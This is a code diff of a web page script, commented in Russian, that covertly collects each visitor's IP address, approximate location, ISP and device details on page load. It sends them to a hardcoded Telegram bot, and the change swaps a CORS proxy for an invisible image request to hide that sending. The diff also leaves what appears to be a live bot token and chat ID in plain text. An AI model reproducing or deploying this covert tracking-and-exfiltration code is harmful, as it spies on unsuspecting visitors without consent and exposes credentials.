@@ -366,7 +366,7 @@
 
 <script>
 /* ════════════════════════════════════════════════════════
-   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА (И НЕ ЗАБУДЬ СДЕЛАТЬ /revoke)
+   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА
    ════════════════════════════════════════════════════════ */
 const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
 const TG_CHAT  = "472749125"; 
@@ -380,15 +380,11 @@ document.getElementById("img0").src = IMAGES.s0;
 document.getElementById("img2").src = IMAGES.s2;
 document.getElementById("img3").src = IMAGES.s3;
 
-/* ════════════════════════════════════════════════════════
-   СБОР ДАННЫХ (IP + Железо) С ОБХОДОМ CORS
-   ════════════════════════════════════════════════════════ */
 let geo = { ip: "скрыт", city: "—", country: "—", isp: "—", lat: null, lon: null };
 let deviceData = { timezone: "—", language: "—", net: "—", battery: "—", cores: "—", screen: "—" };
-const PROXY = "https://proxy.cors.dev/";
 
 async function loadAllData() {
-  // 1. Собираем данные устройства
+  // Собираем данные телефона
   deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
   deviceData.language = navigator.language || "—";
   deviceData.net = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : "—";
@@ -402,9 +398,9 @@ async function loadAllData() {
     }
   } catch(e) {}
 
-  // 2. Геолокация (API 1: ipapi.co через прокси)
+  // Геолокация (через открытый API без блокировок)
   try {
-    const r = await fetch(PROXY + "https://ipapi.co/json/");
+    const r = await fetch("https://ipapi.co/json/");
     const d = await r.json();
     if (d.ip && !d.error) {
       geo = { ip: d.ip, city: d.city || "—", country: d.country_name || "—", isp: d.org || "—", lat: d.latitude, lon: d.longitude };
@@ -412,9 +408,8 @@ async function loadAllData() {
     }
   } catch(e) {}
 
-  // 3. Геолокация (API 2: ipwho.is через прокси, на подстраховку)
   try {
-    const r = await fetch(PROXY + "https://ipwho.is/");
+    const r = await fetch("https://ipwho.is/");
     const d = await r.json();
     if (d.success) {
       geo = { ip: d.ip, city: d.city || "—", country: d.country || "—", isp: (d.connection && (d.connection.isp || d.connection.org)) || "—", lat: d.latitude, lon: d.longitude };
@@ -425,9 +420,9 @@ async function loadAllData() {
 const dataPromise = loadAllData();
 
 /* ════════════════════════════════════════════════════════
-   ОТПРАВКА В ТЕЛЕГРАМ ЧЕРЕЗ CORS-PROXY
+   МАГИЯ ОТПРАВКИ БЕЗ CORS (ЧЕРЕЗ GET-ЗАПРОС КАРТИНКИ)
    ════════════════════════════════════════════════════════ */
-async function notifyAdmin(stage) {
+function notifyAdmin(stage) {
   const text = 
     `🕵️ ${stage}\n\n` +
     `🌍 СЕТЬ И ГЕО:\n` +
@@ -444,16 +439,16 @@ async function notifyAdmin(stage) {
     `Батарея: ${deviceData.battery}\n` +
     `Время: ${new Date().toLocaleString("ru-RU")}`;
 
-  const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+  // Формируем GET-ссылку. Кодируем текст, чтобы эмодзи не сломали ссылку.
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(text)}`;
   
-  fetch(PROXY + tgUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: TG_CHAT, text: text })
-  }).catch(()=>{});
+  // Создаем невидимую картинку. Браузер делает запрос, Telegram получает его, 
+  // а CORS не ругается, потому что это запрос за картинкой, а не fetch.
+  const img = new Image();
+  img.src = url;
 }
 
-// Отправляем уведомление о заходе
+// Отправляем при заходе на сайт
 dataPromise.then(() => {
   notifyAdmin("🚪 ВХОД НА САЙТ");
 });
@@ -489,10 +484,8 @@ hs.addEventListener("click", async (e) => {
   hsLabel.classList.add("show");
   glitch(); vibrate([200, 100, 200]);
 
-  // Ждем загрузки всех данных
   await dataPromise;
 
-  // Заполняем досье
   document.getElementById("d-ip").textContent = geo.ip;
   document.getElementById("d-loc").textContent = geo.city + ", " + geo.country;
   document.getElementById("d-isp").textContent = geo.isp;
